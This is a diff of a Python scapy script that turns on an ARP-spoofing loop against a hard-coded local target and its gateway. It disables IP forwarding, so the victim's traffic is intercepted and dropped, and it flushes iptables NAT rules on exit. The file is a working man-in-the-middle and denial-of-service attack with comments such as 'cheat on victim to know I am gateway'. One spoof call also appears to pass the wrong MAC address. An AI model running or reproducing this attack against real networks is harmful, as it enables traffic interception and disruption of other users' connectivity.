@@ -6,7 +6,7 @@ import scapy.all as scapy
 # print(sys.path)
 
 def get_mac(ip):
-    for a in range(10):
+    for a in range(20):
         arp_request = scapy.ARP(pdst = ip)
         broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast / arp_request
@@ -17,7 +17,6 @@ def get_mac(ip):
         else:
             return answered_list[0][1].hwsrc
     print("Can't find mac address")
-    os.exit(1)
 
 def spoof(target_ip, spoof_ip, target_mac):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
@@ -89,25 +88,22 @@ if __name__ == '__main__':
 
     address, netmask, broadcast, slash, gw = get_local_info()
 
-    # print(get_mac('192.168.99.100')) 
-    result = getDevice(address + '/' + slash, gw)
-
-    # target_ip = "172.20.10.11" # Enter your target IP
-    # gateway_ip = "192.168.99.1" # Enter your gateway's IP
     gateway_ip = gw
     target_ip = '192.168.99.208' # server = '224.0.0.251', iot = '192.168.99.104'
+    # target_mac = '6c:21:a2:5b:6e:02'
+    print("Trying to reach target: 192.168.99.208 ...")
     target_mac = get_mac(target_ip)
-    # print(get_mac(target_ip))
+    print("Finally I got MAC: {}".format(get_mac(target_ip)))
 
-    # try:
-    #     sent_packets_count = 0
-    #     os.system("sysctl -w net.ipv4.ip_forward=0")
-    #     while True:
-    #         spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
-    #         spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
-    #         sent_packets_count = sent_packets_count + 2
-    #         print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
-    #         # time.sleep(0.5) # Waits for two seconds
+    try:
+        sent_packets_count = 0
+        os.system("sysctl -w net.ipv4.ip_forward=0")
+        while True:
+            spoof(target_ip, gateway_ip, target_mac) # cheat on victim to know I am gateway
+            spoof(gateway_ip, target_ip, target_mac) # cheat on switch to know I am target
+            sent_packets_count = sent_packets_count + 2
+            print("\r[*] Packets Sent "+ str(sent_packets_count), end ="")
+            # time.sleep(0.5) # Waits for two seconds
     
     # # try:
     # #     sent_packets_count = 0
@@ -122,8 +118,8 @@ if __name__ == '__main__':
     # #                 print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
     # #                 # time.sleep(0.5) # Waits for two seconds
 
-    # except KeyboardInterrupt:
-    #     print("\nCtrl + C pressed.............Exiting")
-    #     print("[-] Arp Spoof Stopped")
-    #     os.system("iptables -t nat -F")
-    #     print("stop thread")
+    except KeyboardInterrupt:
+        print("\nCtrl + C pressed.............Exiting")
+        print("[-] Arp Spoof Stopped")
+        os.system("iptables -t nat -F")
+        print("stop thread")
